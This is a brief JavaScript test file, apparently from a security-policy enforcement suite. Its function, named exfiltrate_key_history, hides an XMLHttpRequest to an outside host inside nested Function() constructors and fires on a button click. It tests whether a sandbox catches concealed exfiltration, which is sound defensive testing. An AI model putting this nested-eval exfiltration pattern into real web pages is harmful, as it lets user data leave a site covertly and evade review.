// exfil_test_func_nested3.js
function exfiltrate_key_history() {
  var nest = 'var exp=\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest3", true);xmlhttp.send(null);\';return Function(exp);';
  JAM.call(Function, null, [nest])()();
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

